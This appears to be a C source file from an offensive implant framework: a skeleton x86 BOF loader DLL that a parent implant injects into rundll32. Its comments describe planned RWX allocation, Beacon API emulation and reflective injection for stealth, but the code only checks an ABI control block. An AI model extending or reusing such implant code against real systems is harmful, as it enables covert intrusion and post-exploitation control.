/*
 * loader.c — slice 1.d phase C step 0 skeleton.
 *
 * This is the WoW64 (x86) BOF loader the parent x64 implant injects
 * into a SysWOW64 helper process (default rundll32.exe x86). Once
 * fully implemented, BOFExec walks the COFF, allocs RWX, resolves
 * Beacon API imports against the in-DLL implementation, applies
 * relocations, and calls the BOF entrypoint. Output / errors flow
 * back through the shared control block (see abi.h).
 *
 * This skeleton compiles, exports BOFExec, validates the ABI
 * magic/version, and acknowledges the control block. The actual
 * COFF parser + Beacon API impl + relocation engine are queued for
 * phase C step 1.
 *
 * Build: scripts/build-bof-x86-loader.sh (Podman fallback if
 * i686-w64-mingw32-gcc isn't on PATH).
 *
 * Why an external DLL rather than embedded shellcode: a real DLL
 * loaded via LoadLibraryA inherits Win32 import resolution for
 * free — the loader can call kernel32!VirtualAlloc /
 * VirtualProtect / WriteFile etc. through the OS's own import
 * table, no manual PEB walk inside the child. Operators paying for
 * stealth can swap the LoadLibrary path for a reflective injector
 * later; phase C step 0 prioritises correctness.
 */

#include <windows.h>
#include <stdint.h>

#include "abi.h"

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)hinst;
    (void)reason;
    (void)reserved;
    return TRUE;
}

uint32_t __stdcall BOFExec(bof_control_t *ctrl)
{
    if (ctrl == NULL) {
        return 0xDEADBEEF;
    }

    if (ctrl->magic != BOF_CTRL_MAGIC || ctrl->version != BOF_CTRL_VERSION) {
        ctrl->status     = BOF_STATUS_ABI_MISMATCH;
        ctrl->error_code = ctrl->magic ^ BOF_CTRL_MAGIC;
        return BOF_STATUS_ABI_MISMATCH;
    }

    ctrl->status = BOF_STATUS_RUNNING;

    /* Phase C step 1 (queued): parse ctrl->bof_addr / bof_len,
     * VirtualAlloc, relocate, resolve __imp_Beacon* against the
     * in-DLL stubs, call entry "go" with ctrl->args_*.
     * For now: ack so the parent can validate the IPC + ABI. */

    ctrl->out_len = 0;
    ctrl->err_len = 0;
    ctrl->status  = BOF_STATUS_DONE;
    return BOF_STATUS_DONE;
}
